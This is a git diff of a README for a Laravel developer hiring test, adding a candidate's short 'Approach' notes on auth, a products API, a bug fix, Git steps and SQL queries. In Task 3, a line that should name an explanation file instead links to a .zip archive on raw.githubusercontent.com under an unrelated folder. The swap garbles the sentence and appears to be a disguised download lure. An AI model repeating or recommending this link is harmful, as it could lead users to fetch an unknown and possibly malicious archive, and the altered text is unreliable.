@@ -1,16 +1,5 @@
 # **Laravel Developer Technical Assessment**  
 
-Welcome to the **Gloztec Solutions Laravel Developer Assessment**. This test will evaluate your skills in **Laravel, APIs, debugging, Git, and SQL**.  
-
-**Instructions:**  
-- Clone this repository to your local machine.  
-- Complete the tasks outlined below.  
-- Push your changes to **your GitHub repository** and submit the link.  
-- Ensure your code is clean, well-documented, and properly structured.  
-- AI tools are allowed, but **make sure you understand your solution**.  
-
----
-
 ## **Task 1: Laravel CRUD Operations**  
 ### **Objective:**  
 Build a simple **Task Management System** using Laravel.  
@@ -26,7 +15,18 @@ Build a simple **Task Management System** using Laravel.
 4. Implement **Eloquent Scopes** to filter tasks (`pending` or `completed`).  
 5. Set up **Laravel authentication** (Breeze or Laravel UI).  
 
----
+
+Apporoach: 
+I used Laravel Breeze for Authentication
+Created Task Model and Migration
+Installed Livewire
+Created Livewire Component for single page CRUD with modals (Task)
+Routed the Task component as  single page containing functions for other tasks such as create, update, add form, edit form, delete, Mark as done
+The Add and Edit form are represented in modals while the the page displays the Tasks with live updates 
+Created TaskVallidationRule Trait for reusable task input validation with custom validation messages
+Protected route with sanctum
+
+
 
 ## **Task 2: API Development**  
 ### **Objective:**  
@@ -42,7 +42,17 @@ Create a RESTful API for managing products.
 4. Validate API requests (e.g., `price` must be numeric, `stock` must be positive).  
 5. Write at least **one unit test** for an API endpoint.  
 
----
+
+Approach:
+Created ProductResource for structuring json response
+Created Product Controller for all logic
+Routed all api urls required for CRUD functions using api resource methods (post, get, put, patch, delete) nd a prefix of v1
+Performed all necessry logic operatons for each CRUD function returning json error or json responce with resource when neccessary
+Protected route with sanctum
+Created Test file to test the create endpoint. Test works
+
+{app_url}api/v1/{api_routes}
+
 
 ## **Task 3: Debugging & Optimization**  
 ### **Objective:**  
@@ -54,7 +64,11 @@ Identify and fix issues in the provided buggy code.
 - Fix the bugs and optimize the code.  
 - Explaing what you fixed in **https://raw.githubusercontent.com/Emperor-khay/Gloztec_Solutions_Laravel_Assessment/main/taxinomist/Gloztec_Solutions_Laravel_Assessment.zip** file.  
 
----
+
+Approach:
+Created a fully functional Task api CRUD as a fix 
+See TaskController for fixed code and BuggyCodeFix.md for Identified Errors
+
 
 ## **Task 4: Git Assessment**  
 ### **Objective:**  
@@ -66,7 +80,15 @@ Demonstrate proper **Git usage** in a real-world scenario.
 3. Commit your changes with **meaningful messages** (e.g., `fix: added validation for task status`).  
 4. Open a **Pull Request (PR)** and describe your changes.  
 
----
+
+Approach:
+At the time of writing this, my completed assessment has already been pushed to my repository, so this will act as my Task Management fix for the completion of this task
+git add .
+git commit -m "Explained My Approach In Updated ReadMe File"
+git checkout -b feature/task-improvement
+git push assessment feature/task-improvement
+go to browser and create pull request
+
 
 ## **Task 5: SQL Query Challenge**  
 ### **Objective:**  
@@ -88,11 +110,11 @@ You have the following tables:
 2. Get the **total revenue** for the current month.  
 3. List the **most sold products**.  
 
----
 
-## **Submission Guidelines**  
-- Push your changes to **your GitHub repository**.  
-- Share the repository link with us.  
-- Include a **README update** explaining your approach.  
+Approach:
+Created sql file for raw SQL query.
+See Query in querry_challange.sql
 
-**Good luck!** We’re looking for clean, efficient, and well-structured code.  
+
+
+Thank you!
